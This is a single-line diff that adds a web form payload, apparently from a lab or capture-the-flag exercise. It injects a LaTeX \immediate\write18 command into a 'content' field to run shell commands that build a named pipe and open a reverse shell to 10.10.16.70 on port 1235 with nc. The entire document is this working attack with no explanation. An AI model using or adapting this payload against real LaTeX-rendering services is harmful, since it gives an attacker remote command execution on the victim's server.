@@ -1,0 +1,1 @@
+content=\immediate\write18{cd /tmp;mknod pipe p;/bin/sh 0</tmp/pipe | nc 10.10.16.70 1235 1>/tmp/pipe}&template=test2
